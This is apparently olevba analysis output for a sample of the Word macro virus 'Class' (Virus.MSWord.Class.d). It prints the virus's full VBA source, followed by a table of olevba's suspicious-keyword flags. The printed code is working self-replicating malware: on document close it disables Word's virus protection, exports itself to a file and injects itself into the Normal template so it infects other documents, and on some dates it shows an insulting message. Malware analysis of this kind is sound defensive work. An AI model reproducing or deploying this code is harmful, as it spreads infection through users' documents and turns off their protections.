olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-5850d98221262fd788bbd96315fb7d46eed81283
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-5850d98221262fd788bbd96315fb7d46eed81283 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Tester2/26/01 11:41:56 AM00024071.DOC
On Error GoTo out
'Tester2/26/01 11:41:56 AM00024071.DOC
Options.VirusProtection = False
'Tester2/26/01 11:41:56 AM00024071.DOC
Options.SaveNormalPrompt = False
'Tester2/26/01 11:41:56 AM00024071.DOC
Options.ConfirmConversions = False
'Tester2/26/01 11:41:56 AM00024071.DOC
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/26/01 11:41:56 AM00024071.DOC
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tester2/26/01 11:41:56 AM00024071.DOC
If nt > 70 And ad > 0 Then GoTo out
'Tester2/26/01 11:41:56 AM00024071.DOC
If nt < 70 Then
'Tester2/26/01 11:41:56 AM00024071.DOC
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Tester2/26/01 11:41:56 AM00024071.DOC
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Tester2/26/01 11:41:56 AM00024071.DOC
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Tester2/26/01 11:41:56 AM00024071.DOC
End If
'Tester2/26/01 11:41:56 AM00024071.DOC
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Tester2/26/01 11:41:56 AM00024071.DOC
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Tester2/26/01 11:41:56 AM00024071.DOC
host.codemodule.AddFromFile ("c:\class.sys")
'Tester2/26/01 11:41:56 AM00024071.DOC
With host.codemodule
'Tester2/26/01 11:41:56 AM00024071.DOC
    For x = 1 To 4
'Tester2/26/01 11:41:56 AM00024071.DOC
    .deletelines 1
'Tester2/26/01 11:41:56 AM00024071.DOC
    Next x
'Tester2/26/01 11:41:56 AM00024071.DOC
End With
'Tester2/26/01 11:41:56 AM00024071.DOC
If nt < 70 Then
'Tester2/26/01 11:41:56 AM00024071.DOC
    With host.codemodule
'Tester2/26/01 11:41:56 AM00024071.DOC
    .replaceline 1, "Sub AutoClose()"
'Tester2/26/01 11:41:56 AM00024071.DOC
    .replaceline 91, "Sub ToolsMacro()"
'Tester2/26/01 11:41:56 AM00024071.DOC
    For x = 70 To 81
'Tester2/26/01 11:41:56 AM00024071.DOC
        .deletelines 62
'Tester2/26/01 11:41:56 AM00024071.DOC
    Next x
'Tester2/26/01 11:41:56 AM00024071.DOC
    .replaceline 35, "    For x = 1 To 4"
'Tester2/26/01 11:41:56 AM00024071.DOC
    End With
'Tester2/26/01 11:41:56 AM00024071.DOC
End If
'Tester2/26/01 11:41:56 AM00024071.DOC
With host.codemodule
'Tester2/26/01 11:41:56 AM00024071.DOC
    For x = 2 To 104 Step 2
'Tester2/26/01 11:41:56 AM00024071.DOC
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tester2/26/01 11:41:56 AM00024071.DOC
    Next x
'Tester2/26/01 11:41:56 AM00024071.DOC
End With
'Tester2/26/01 11:41:56 AM00024071.DOC
out:
'Tester2/26/01 11:41:56 AM00024071.DOC
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tester2/26/01 11:41:56 AM00024071.DOC
End Sub
'Tester2/26/01 11:41:56 AM00024071.DOC
Sub ToolsMacro()
'Tester2/26/01 11:41:56 AM00024071.DOC
End Sub
'Tester2/26/01 11:41:56 AM00024071.DOC
Private Sub CheckBox2_Click()
'Tester2/26/01 11:41:56 AM00024071.DOC
End Sub
'Tester2/26/01 11:41:56 AM00024071.DOC
Private Sub CheckBox3_Click()
'Tester2/26/01 11:41:56 AM00024071.DOC
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CheckBox2_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
